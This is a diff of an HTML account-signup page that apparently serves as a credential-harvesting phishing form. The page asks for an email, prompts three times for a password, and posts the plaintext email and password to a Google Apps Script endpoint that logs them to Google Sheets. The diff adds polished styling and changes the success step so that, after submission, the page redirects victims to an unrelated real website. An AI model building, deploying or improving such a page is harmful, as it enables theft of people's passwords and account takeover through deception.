@@ -2,19 +2,71 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Signup Form</title>
+  <title>Create Account</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .card {
+      background: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      width: 350px;
+      text-align: center;
+    }
+    .card h2 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+    input[type="email"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    input[type="submit"] {
+      width: 100%;
+      padding: 12px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    input[type="submit"]:hover {
+      background-color: #0056b3;
+    }
+    #msg {
+      margin-bottom: 15px;
+      color: red;
+      font-size: 14px;
+      min-height: 18px;
+    }
+  </style>
 </head>
 <body>
-  <h2>Create Account</h2>
-  <div id="msg" style="color:red;"></div>
-  <form id="form">
-    Email: <br>
-    <input type="email" id="email" required><br><br>
-    <input type="submit" value="Submit">
-  </form>
+
+  <div class="card">
+    <h2>Create Account</h2>
+    <div id="msg"></div>
+    <form id="form">
+      <input type="email" id="email" placeholder="Enter your email" required>
+      <input type="submit" value="Submit">
+    </form>
+  </div>
 
   <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbwVLgKxXoE7SLIpXhxhr0H2pgDAEqNRRX3bj0qGfMCK8x2xMkJHR0wDOlNBpXaUDkE/exec"; // replace with your Apps Script URL
+    const scriptURL = "https://script.google.com/macros/s/AKfycbwVLgKxXoE7SLIpXhxhr0H2pgDAEqNRRX3bj0qGfMCK8x2xMkJHR0wDOlNBpXaUDkE/exec";
     const form = document.getElementById("form");
     const msg = document.getElementById("msg");
 
@@ -22,14 +74,18 @@
       e.preventDefault();
       msg.textContent = "";
 
-      const email = document.getElementById("email").value;
-      let pass1 = prompt("Enter your password:");
-      if (pass1 === null) return; // user canceled
+      const email = document.getElementById("email").value.trim();
+      if (!email) {
+        msg.textContent = "Please enter an email.";
+        return;
+      }
 
-      let pass2 = prompt("Re-enter your password:");
+      // Prompt for password three times
+      const pass1 = prompt("Enter your password:");
+      if (pass1 === null) return;
+      const pass2 = prompt("Re-enter your password:");
       if (pass2 === null) return;
-
-      let pass3 = prompt("Enter password again:");
+      const pass3 = prompt("Enter password again:");
       if (pass3 === null) return;
 
       if (pass1 !== pass2 || pass1 !== pass3) {
@@ -37,25 +93,26 @@
         return;
       }
 
-      // All passwords match, send to Google Sheets
+      // Send to Google Sheets
       fetch(scriptURL, {
-        method: 'POST',
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email: email, password: pass1 })
       })
-      .then(res => res.json())
+      .then(response => response.json())
       .then(data => {
         if (data.result === "success") {
           alert("Submitted successfully!");
-          form.reset();
+          window.location.href = "https://www.torrins.com/";
         } else {
           msg.textContent = "Error: " + (data.message || "Unknown error");
         }
       })
       .catch(err => {
-        msg.textContent = "Network error.";
+        msg.textContent = "Network error: " + err;
       });
     });
   </script>
+
 </body>
 </html>
-
